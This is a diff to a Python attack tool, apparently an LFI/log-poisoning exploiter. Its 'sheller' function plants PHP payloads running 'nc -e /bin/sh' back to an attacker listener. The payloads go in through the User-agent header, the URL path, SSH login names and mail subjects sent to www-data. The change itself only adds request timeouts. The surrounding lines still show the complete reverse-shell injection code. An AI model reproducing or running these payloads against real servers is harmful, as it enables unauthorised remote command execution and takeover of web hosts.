@@ -584,21 +584,21 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
         if technique == 1:
             prep.headers['User-agent'] = '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep)
+            s.send(prep, timeout=timeout)
             prep.headers['User-agent'] = '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep)
+            s.send(prep, timeout=timeout)
             prep.headers['User-agent'] = '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep)
+            s.send(prep, timeout=timeout)
         elif technique == 2:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
             prep2.url = url + "/" + '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep2)
+            s.send(prep2, timeout=timeout)
             prep2.url = url + "/" + '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep2)
+            s.send(prep2, timeout=timeout)
             prep2.url = url + "/" + '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-            s.send(prep2)
-            s.send(prep)
+            s.send(prep2, timeout=timeout)
+            s.send(prep, timeout=timeout)
         elif technique == 3:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -609,7 +609,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             '<?php passthru("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
             for ssh in sshs:
                 subprocess.call(["ssh", ssh])
-            s.send(prep)
+            s.send(prep, timeout=timeout)
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -621,7 +621,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             for topic in topics:
                 p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
                 subprocess.call(["mail", "-s", topic, "www-data@{}".format(host)], stdin=p.stdout)
-            s.send(prep)
+            s.send(prep, timeout=timeout)
 
 
         
